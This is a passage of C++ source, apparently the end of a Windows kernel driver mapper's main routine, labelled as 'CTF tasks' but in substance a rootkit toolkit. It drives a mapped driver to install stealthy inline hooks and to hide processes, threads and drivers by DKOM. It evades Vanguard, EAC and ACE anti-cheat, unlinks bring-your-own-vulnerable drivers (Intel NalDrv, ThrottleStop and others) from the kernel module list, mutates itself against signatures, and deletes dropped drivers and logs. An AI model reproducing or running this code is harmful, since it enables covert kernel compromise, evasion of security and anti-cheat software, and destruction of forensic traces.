            // ── CTF Task 88: Trampoline Hook Framework ──
            #define _IOCTL_TRAMP_HOOK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x861, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct ThSub { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct ThResp { DWORD ActiveFeatures; DWORD TotalItems; ThSub Install; ThSub Remove; ThSub Query; ThSub Toggle; ThSub TrampMgr; ThSub ThreadSafe; DWORD HooksInstalled; DWORD HooksRemoved; DWORD HooksActive; DWORD TrampolinesAlloc; DWORD BytesSaved; DWORD Pad; };
            if (g_trampHookFlags) {
                Log("[*] Trampoline hooking: features 0x%x\n", g_trampHookFlags);
                struct { DWORD Features; DWORD Flags; UINT64 Reserved; } thReq = { g_trampHookFlags, 0, 0 };
                ThResp thResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_TRAMP_HOOK, &thReq, sizeof(thReq), &thResp, sizeof(thResp), &ret, nullptr);
                if (!ok) { Log("[!] Tramp hook: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] Tramp hook: active=0x%x total=%u hooks=%u tramps=%u saved=%u bytes\n",
                        thResp.ActiveFeatures, thResp.TotalItems, thResp.HooksInstalled, thResp.TrampolinesAlloc, thResp.BytesSaved);
                    struct { const char* n; DWORD f; ThSub* s; } ss[] = {
                        {"Install",0x01,&thResp.Install},{"Remove",0x02,&thResp.Remove},{"Query",0x04,&thResp.Query},
                        {"Toggle",0x08,&thResp.Toggle},{"TrampMgr",0x10,&thResp.TrampMgr},{"ThreadSafe",0x20,&thResp.ThreadSafe}};
                    for (auto& s : ss) { if (g_trampHookFlags & s.f) Log("[+]   %s: %s (items=%u fail=%u last=0x%x)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed, s.s->FailCount, s.s->LastResult); }
                }
            } else { Log("[+] Skipped: Tramp hook (use --tramp-hook 3f)\n"); }

            // ── CTF Task 89: Stealthy Inline Hooking ──
            #define _IOCTL_STEALTH_HOOK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x862, METHOD_BUFFERED, FILE_ANY_ACCESS)
            if (g_stealthHookFlags) {
                Log("[*] Stealth hooking: features 0x%x\n", g_stealthHookFlags);
                struct { DWORD Features; DWORD StealthLevel; UINT64 Reserved; } shReq = { g_stealthHookFlags, 2, 0 };
                struct { DWORD ActiveFeatures; DWORD TotalItems; ThSub Rel5; ThSub Alloc; ThSub Behav; ThSub Integ; ThSub Levels; ThSub Verify; DWORD BytesPatched; DWORD NearAlloc; DWORD StealthScore; DWORD Pad; } shResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_STEALTH_HOOK, &shReq, sizeof(shReq), &shResp, sizeof(shResp), &ret, nullptr);
                if (!ok) { Log("[!] Stealth hook: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] Stealth hook: active=0x%x total=%u patched=%u near=%u score=%u\n",
                        shResp.ActiveFeatures, shResp.TotalItems, shResp.BytesPatched, shResp.NearAlloc, shResp.StealthScore);
                    struct { const char* n; DWORD f; ThSub* s; } ss[] = {
                        {"Rel5Jmp",0x01,&shResp.Rel5},{"AllocStrat",0x02,&shResp.Alloc},{"Behavioral",0x04,&shResp.Behav},
                        {"Integration",0x08,&shResp.Integ},{"Levels",0x10,&shResp.Levels},{"Verify",0x20,&shResp.Verify}};
                    for (auto& s : ss) { if (g_stealthHookFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: Stealth hook (use --stealth-hook 3f)\n"); }

            // ── CTF Task 90: Safer DKOM ──
            #define _IOCTL_SAFE_DKOM CTL_CODE(FILE_DEVICE_UNKNOWN, 0x863, METHOD_BUFFERED, FILE_ANY_ACCESS)
            if (g_safeDkomFlags) {
                Log("[*] Safe DKOM: features 0x%x\n", g_safeDkomFlags);
                struct { DWORD Features; DWORD Mode; UINT64 Reserved; } sdReq = { g_safeDkomFlags, 1, 0 };
                struct { DWORD ActiveFeatures; DWORD TotalItems; ThSub Proc; ThSub Thread; ThSub Drv; ThSub PgChk; ThSub Restore; ThSub Logging; DWORD Hidden; DWORD PgRisk; DWORD Restored; DWORD Mode; } sdResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_SAFE_DKOM, &sdReq, sizeof(sdReq), &sdResp, sizeof(sdResp), &ret, nullptr);
                if (!ok) { Log("[!] Safe DKOM: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] Safe DKOM: active=0x%x total=%u hidden=%u risk=%u mode=%u\n",
                        sdResp.ActiveFeatures, sdResp.TotalItems, sdResp.Hidden, sdResp.PgRisk, sdResp.Mode);
                    struct { const char* n; DWORD f; ThSub* s; } ss[] = {
                        {"ProcHide",0x01,&sdResp.Proc},{"ThreadHide",0x02,&sdResp.Thread},{"DrvHide",0x04,&sdResp.Drv},
                        {"PgCheck",0x08,&sdResp.PgChk},{"Restore",0x10,&sdResp.Restore},{"Logging",0x20,&sdResp.Logging}};
                    for (auto& s : ss) { if (g_safeDkomFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: Safe DKOM (use --safe-dkom 3f)\n"); }

            // ── CTF Task 91: Deep AC Resistance Fix ──
            #define _IOCTL_DEEP_AC_FIX CTL_CODE(FILE_DEVICE_UNKNOWN, 0x864, METHOD_BUFFERED, FILE_ANY_ACCESS)
            if (g_deepAcFixFlags) {
                Log("[*] Deep AC fix: features 0x%x\n", g_deepAcFixFlags);
                struct { DWORD Features; DWORD Flags; UINT64 Reserved; } dfReq = { g_deepAcFixFlags, 0, 0 };
                struct { DWORD ActiveFeatures; DWORD TotalItems; ThSub Ept; ThSub MemScram; ThSub TCloak; ThSub PgStab; ThSub Diag; ThSub RtFlags; DWORD EptPages; DWORD MemRegions; DWORD Threads; DWORD PgTimers; } dfResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_DEEP_AC_FIX, &dfReq, sizeof(dfReq), &dfResp, sizeof(dfResp), &ret, nullptr);
                if (!ok) { Log("[!] Deep AC fix: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] Deep AC fix: active=0x%x total=%u ept=%u mem=%u threads=%u timers=%u\n",
                        dfResp.ActiveFeatures, dfResp.TotalItems, dfResp.EptPages, dfResp.MemRegions, dfResp.Threads, dfResp.PgTimers);
                    struct { const char* n; DWORD f; ThSub* s; } ss[] = {
                        {"EptResist",0x01,&dfResp.Ept},{"MemScramble",0x02,&dfResp.MemScram},{"ThreadCloak",0x04,&dfResp.TCloak},
                        {"PgStability",0x08,&dfResp.PgStab},{"Diagnostics",0x10,&dfResp.Diag},{"RuntimeFlags",0x20,&dfResp.RtFlags}};
                    for (auto& s : ss) { if (g_deepAcFixFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: Deep AC fix (use --deep-ac-fix 3f)\n"); }

            // ── CTF Task 92: Unified DKOM ──
            #define _IOCTL_UNIFIED_DKOM CTL_CODE(FILE_DEVICE_UNKNOWN, 0x865, METHOD_BUFFERED, FILE_ANY_ACCESS)
            if (g_unifiedDkomFlags) {
                Log("[*] Unified DKOM: features 0x%x\n", g_unifiedDkomFlags);
                struct { DWORD Features; DWORD Mode; UINT64 Reserved; } udReq = { g_unifiedDkomFlags, 1, 0 };
                struct { DWORD ActiveFeatures; DWORD TotalItems; ThSub Consolid; ThSub AutoRestore; ThSub VerifyLink; ThSub Modes; ThSub Flags; ThSub LogS; DWORD Procs; DWORD Threads; DWORD Drivers; DWORD RestPend; } udResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_UNIFIED_DKOM, &udReq, sizeof(udReq), &udResp, sizeof(udResp), &ret, nullptr);
                if (!ok) { Log("[!] Unified DKOM: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] Unified DKOM: active=0x%x total=%u procs=%u threads=%u drivers=%u pending=%u\n",
                        udResp.ActiveFeatures, udResp.TotalItems, udResp.Procs, udResp.Threads, udResp.Drivers, udResp.RestPend);
                    struct { const char* n; DWORD f; ThSub* s; } ss[] = {
                        {"Consolidate",0x01,&udResp.Consolid},{"AutoRestore",0x02,&udResp.AutoRestore},{"VerifyLink",0x04,&udResp.VerifyLink},
                        {"Modes",0x08,&udResp.Modes},{"Flags",0x10,&udResp.Flags},{"Logging",0x20,&udResp.LogS}};
                    for (auto& s : ss) { if (g_unifiedDkomFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: Unified DKOM (use --unified-dkom 3f)\n"); }

            // ── CTF Task 93: Post-Mapping Verification ──
            #define _IOCTL_POST_VERIFY CTL_CODE(FILE_DEVICE_UNKNOWN, 0x866, METHOD_BUFFERED, FILE_ANY_ACCESS)
            if (g_postVerify) {
                struct { DWORD Action; DWORD Pad; } pvReq = { 1, 0 };
                struct { DWORD Active; DWORD VMaj; DWORD VMin; DWORD Loaded; DWORD Skipped; DWORD IoctlOk; DWORD IoctlFail; DWORD Uptime; WCHAR DevName[32]; DWORD Hooks; DWORD Dkom; DWORD Stealth; DWORD Pad; } pvResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_POST_VERIFY, &pvReq, sizeof(pvReq), &pvResp, sizeof(pvResp), &ret, nullptr);
                if (!ok) { Log("[!] Post-verify: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] Driver verified: v%u.%u active=%u hooks=%u dkom=%u stealth=%u uptime=%us\n",
                        pvResp.VMaj, pvResp.VMin, pvResp.Active, pvResp.Hooks, pvResp.Dkom, pvResp.Stealth, pvResp.Uptime);
                    Log("[+] Driver successfully loaded and active\n");
                }
            }

            // ── CTF Task 94: Post-Mapping Diagnostics ──
            #define _IOCTL_DIAG_MODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x867, METHOD_BUFFERED, FILE_ANY_ACCESS)
            if (g_diagModeFlags) {
                Log("[*] Diagnostics: features 0x%x\n", g_diagModeFlags);
                struct { DWORD Features; DWORD Pad; } dmReq = { g_diagModeFlags, 0 };
                struct { DWORD ActiveFeatures; DWORD TotalItems; ThSub DevChk; ThSub SubsysChk; ThSub CrashDet; ThSub Summary; DWORD DevResp; DWORD SubsActive; DWORD SubsInactive; DWORD CrashInd; DWORD Health; DWORD Pad; } dmResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_DIAG_MODE, &dmReq, sizeof(dmReq), &dmResp, sizeof(dmResp), &ret, nullptr);
                if (!ok) { Log("[!] Diagnostics: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] Diagnostics: health=%u%% active=%u inactive=%u crashes=%u\n",
                        dmResp.Health, dmResp.SubsActive, dmResp.SubsInactive, dmResp.CrashInd);
                    struct { const char* n; DWORD f; ThSub* s; } ss[] = {
                        {"DeviceCheck",0x01,&dmResp.DevChk},{"SubsysCheck",0x02,&dmResp.SubsysChk},
                        {"CrashDetect",0x04,&dmResp.CrashDet},{"Summary",0x08,&dmResp.Summary}};
                    for (auto& s : ss) { if (g_diagModeFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: Diagnostics (use --diag 0f)\n"); }

            // DKOM: unlink BYOVD driver from PsLoadedModuleList BEFORE mutation
            Log("[*] DKOM: unlinking drivers from PsLoadedModuleList (KVA=0x%llx)\n",
                (unsigned long long)g_psLoadedModuleListKVA);
            if (g_useCorsair) {
                DkomUnlinkDriver(g_primForCleanup, g_psLoadedModuleListKVA, L"CorsairLLAccess64.sys");
            } else if (g_useSivDriver) {
                DkomUnlinkDriver(g_primForCleanup, g_psLoadedModuleListKVA, L"SIVX64.sys");
            } else if (g_useTrixx) {
                DkomUnlinkDriver(g_primForCleanup, g_psLoadedModuleListKVA, L"TRIXX.sys");
            } else if (g_useThrottleStop) {
                DkomUnlinkDriver(g_primForCleanup, g_psLoadedModuleListKVA, L"ThrottleStop.sys");
            } else if (g_useNal) {
                DkomUnlinkDriver(g_primForCleanup, g_psLoadedModuleListKVA, L"NalDrvIntel.sys");
                DkomUnlinkDriver(g_primForCleanup, g_psLoadedModuleListKVA, L"iqvw64e.sys");
                DkomUnlinkDriver(g_primForCleanup, g_psLoadedModuleListKVA, L"NalDrv.sys");
            } else {
                DkomUnlinkDriver(g_primForCleanup, g_psLoadedModuleListKVA, L"TRIXX.sys");
            }

            // ── Final cleanup: cancel all DPC timers, mutate, zero PE ──
            // Runs LAST so it cancels timers started by EAC improve (OB recheck)
            #define _IOCTL_PG_SAFE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x82E, METHOD_BUFFERED, FILE_WRITE_DATA)
            struct { ULONG Action; ULONG Pad; } pgReq0 = { 0, 0 };
            DeviceIoControl(hBetest, _IOCTL_PG_SAFE,
                            &pgReq0, sizeof(pgReq0), nullptr, 0, &ret, nullptr);
            Log("[+] PatchGuard safety: DPC/timer cleanup done\n");

            #define _IOCTL_MUTATE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x832, METHOD_BUFFERED, FILE_WRITE_DATA)
            struct { ULONG Flags; ULONG Pad; } mutReq = { 0x01, 0 };
            DeviceIoControl(hBetest, _IOCTL_MUTATE,
                            &mutReq, sizeof(mutReq), nullptr, 0, &ret, nullptr);
            Log("[+] Driver mutation (anti-signature): sent\n");

            struct { ULONG Action; ULONG Pad; } pgReq1 = { 1, 0 };
            DeviceIoControl(hBetest, _IOCTL_PG_SAFE,
                            &pgReq1, sizeof(pgReq1), nullptr, 0, &ret, nullptr);
            Log("[+] PatchGuard safety: PE checksum zeroed\n");

            CloseHandle(hBetest);
        } else {
            Log("[!] Betest device not available for early-load sweep (err=%u)\n",
                (unsigned)GetLastError());
        }
    }

    // CTF Task 48: Mapper stealth cleanup
    MapperStealthCleanup();

    // DKOM unlink moved earlier — runs before driver mutation kills NalDrv IOCTL

    // STEALTH: Unload NalDrv and scrub all traces
    if (!g_noCleanup) UnloadByovdDriver();
    else Log("[*] BYOVD cleanup skipped (--no-cleanup)\n");

    // Close log handle BEFORE deleting so the file isn't locked
    if (g_logH != INVALID_HANDLE_VALUE) {
        CloseHandle(g_logH);
        g_logH = INVALID_HANDLE_VALUE;
    }

    // STEALTH: Delete driver and diagnostic files from temp
    {
        char tmpDir[MAX_PATH];
        if (GetTempPathA(MAX_PATH, tmpDir)) {
            const char* staleFiles[] = { "WdBroker.sys", "NalDrv.sys", "NalDrvIntel.sys", "iqvw64e.sys", "ThrottleStop.sys", "TRIXX.sys", "SIVX64.sys", "pf_diag.tmp" };
            for (auto& f : staleFiles) {
                char fp[MAX_PATH];
                snprintf(fp, MAX_PATH, "%s%s", tmpDir, f);
                DeleteFileA(fp);
            }
            // Clean PID-suffixed fallback logs (pf_diag_*.tmp)
            char searchPat[MAX_PATH];
            snprintf(searchPat, MAX_PATH, "%spf_diag_*.tmp", tmpDir);
            WIN32_FIND_DATAA fd;
            HANDLE hFind = FindFirstFileA(searchPat, &fd);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    char fp[MAX_PATH];
                    snprintf(fp, MAX_PATH, "%s%s", tmpDir, fd.cFileName);
                    DeleteFileA(fp);
                } while (FindNextFileA(hFind, &fd));
                FindClose(hFind);
            }
        }
    }

    if (g_vanguardMode || g_aceMapMode || g_eacMapMode || g_mapStealthFlags) {
        Log("[+] Task 48: Mapper hardening complete (stealth=0x%x vgk=%d ace=%d eac=%d)\n",
            g_mapStealthFlags, g_vanguardMode, g_aceMapMode, g_eacMapMode);
    }

    SecurityShutdown();
    Log("[+] Done.\n");
    return 0;
}
